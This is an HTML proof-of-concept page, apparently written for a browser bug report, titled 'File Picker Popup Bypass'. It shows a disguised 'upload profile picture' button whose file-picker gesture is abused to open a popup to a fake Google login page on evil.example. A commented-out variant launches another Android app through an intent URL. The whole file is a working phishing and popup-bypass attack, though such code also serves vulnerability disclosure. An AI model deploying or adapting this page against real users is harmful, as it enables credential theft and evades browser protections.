<!doctype html>
<meta name="viewport" content="width=device-width,initial-scale=1">
<title>File Picker Popup Bypass – High Impact PoC</title>
<style>
  html,body {margin:0; height:100%; font-family:sans-serif; background:#fafafa;}
  .full {height:100%; display:flex; align-items:center; justify-content:center; flex-direction:column;}
  .btn {padding:18px 22px; border-radius:10px; background:#222; color:#fff; font-size:18px; cursor:pointer; user-select:none;}
  #fileInput {display:none;}
</style>

<div class="full" id="root">
  <div class="btn">Tap to upload profile picture</div>
  <input id="fileInput" type="file" accept="image/*">
</div>

<script>
  const root = document.getElementById('root');
  const input = document.getElementById('fileInput');

  async function pickerFlow() {
    try {
      if (window.showOpenFilePicker) {
        const [handle] = await showOpenFilePicker({ types: [{ accept: { 'image/*': ['.png','.jpg','.jpeg'] } }] });
        // Simulate "profile upload" then phishing page
        window.open('https://evil.example/fake-google-login.html', '_blank');
        return;
      }
    } catch (e) {
      console.warn('FSAPI not supported, falling back', e);
    }
    input.click();
  }

  input.onchange = () => {
    // Phishing variant
    window.open('https://evil.example/fake-google-login.html', '_blank');

    // Cross-app abuse variant — uncomment to demonstrate
    // window.open('intent://scan/#Intent;scheme=zxing;package=com.google.zxing.client.android;end', '_blank');
  };

  root.addEventListener('click', () => {
    pickerFlow();
  });
</script>
